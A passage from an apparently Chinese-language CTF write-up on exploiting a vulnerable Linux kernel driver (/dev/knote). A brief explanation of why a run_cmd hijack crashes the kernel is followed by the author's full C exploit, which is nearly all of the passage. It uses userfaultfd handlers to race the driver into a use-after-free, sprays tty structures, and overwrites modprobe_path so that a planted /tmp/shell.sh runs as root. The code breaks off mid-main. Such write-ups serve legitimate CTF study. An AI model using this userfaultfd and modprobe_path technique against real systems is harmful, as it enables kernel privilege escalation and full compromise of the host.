alt="wait"></p><p>从代码的注释中可以看到这四个宏的接收，关于UMH_WAIT_EXEC宏作用是，等待exec，而不等待process而UMH_WAIT_PROC是等待process，由此我们可以得出结论，在run_cmd中因为我们使用了gadget来劫持程序执行流程，有可能脚本还没有开始执行，内核线程就直接从run_cmd返回了，然后就会触发非法的一些操作，从而导致整个kernel oops。这应该就是run_cmd不可行的原因。  </p></li></ul><h1 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h1><p> 这里我使用修改modprobe_path的方法来写exp，为了更加稳定，我把exp进程绑定在一个cpu核上，大大增加了成功率。exp如下:</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/userfaultfd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;poll.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;semaphore.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> errExit(msg) do { perror(msg); exit(EXIT_FAILURE);\                        }while(0)</span>sem_t done<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> mychunk<span class="token punctuation">{</span>    uint64_t size<span class="token punctuation">;</span>    uint64_t buf<span class="token punctuation">;</span><span class="token punctuation">}</span>mychunk<span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> tfd<span class="token punctuation">,</span> tfd2<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">hexdump</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x2e0</span><span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+%x:0x%lx       +%x:0x%lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>uint64_t sz<span class="token punctuation">)</span><span class="token punctuation">{</span>    mychunk temp<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>size <span class="token operator">=</span> sz<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">get</span><span class="token punctuation">(</span>uint64_t index<span class="token punctuation">,</span> uint64_t buf<span class="token punctuation">)</span><span class="token punctuation">{</span>    mychunk temp<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>size <span class="token operator">=</span> index<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>buf <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span>uint64_t index<span class="token punctuation">,</span> uint64_t buf<span class="token punctuation">)</span><span class="token punctuation">{</span>    mychunk temp<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>size <span class="token operator">=</span> index<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>buf <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x8888</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">dele</span><span class="token punctuation">(</span>uint64_t index<span class="token punctuation">)</span><span class="token punctuation">{</span>    mychunk temp<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>size <span class="token operator">=</span> index<span class="token punctuation">;</span>    temp<span class="token punctuation">.</span>buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6666</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">define</span> FAULT_PAGE 0xaaaa000</span><span class="token macro property">#<span class="token directive keyword">define</span> FAULT_PAGE2 0xdead000</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">handler</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> uffd_msg msg<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>args<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Handler created"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> pollfd pollfd<span class="token punctuation">;</span>    <span class="token keyword">int</span> nready<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sem open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nready <span class="token operator">=</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nready <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//waiting all the time until copy_from_user read AULT_PAGE</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] Wrong pool return value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Trigger! I'm going to hang'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dele</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open ptmx failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] Error in reading uffd_msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">struct</span> uffdio_copy uc<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>FAULT_PAGE<span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uc<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//recover copy_from_user</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>uint64_t modprobe_path<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">handler2</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> uffd_msg msg<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>args<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Handler created"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> pollfd pollfd<span class="token punctuation">;</span>    <span class="token keyword">int</span> nready<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">sem_post</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sem open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nready <span class="token operator">=</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nready <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//waiting all the time until copy_from_user read AULT_PAGE</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] Wrong pool return value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Trigger! I'm going to hang'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dele</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">=</span> modprobe_path<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] Error in reading uffd_msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> uffdio_copy uc<span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>FAULT_PAGE2<span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    uc<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uc<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//recover copy_from_user</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">register_userfault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> uffdio_api ua<span class="token punctuation">;</span>    <span class="token keyword">struct</span> uffdio_register ur<span class="token punctuation">;</span>    pthread_t thr<span class="token punctuation">;</span>    uint64_t uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get userfaultfd fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ua<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    ua<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ua<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>FAULT_PAGE<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>FAULT_PAGE<span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] mmap fault page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>FAULT_PAGE<span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ur<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>thr<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">register_userfault2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> uffdio_api ua<span class="token punctuation">;</span>    <span class="token keyword">struct</span> uffdio_register ur<span class="token punctuation">;</span>    pthread_t thr<span class="token punctuation">;</span>    uint64_t uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get userfaultfd fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ua<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    ua<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ua<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] ioctl-UFFDIO_API2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>FAULT_PAGE2<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>FAULT_PAGE2<span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] mmap2 fault page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>FAULT_PAGE2<span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>    ur<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ur<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>thr<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> handler2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> cpu_mask <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sem lock"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/knote"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] open note fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> file_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/shell.sh"</span><span class="token punctuation">,</span> O_WRONLY<span class="token operator">|</span>O_CREAT<span class="token operator">|</span>O_NOCTTY<span class="token operator">|</span>O_NONBLOCK<span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>file_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] open shell.sh error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">,</span> <span class="token string">"#!/bin/sh\n"</span>                    <span class="token string">"chmod 777 flag\n"</span>                    <span class="token string">"sleep 20\n"</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    file_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/wrong_elf"</span><span class="token punctuation">,</span> O_WRONLY<span class="token operator">|</span>O_CREAT<span class="token operator">|</span>O_NOCTTY<span class="token operator">|</span>O_NONBLOCK<span class="token punctuation">,</span> <span class="token number">0775</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>file_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"[-] open wrong_elf error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] init done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token 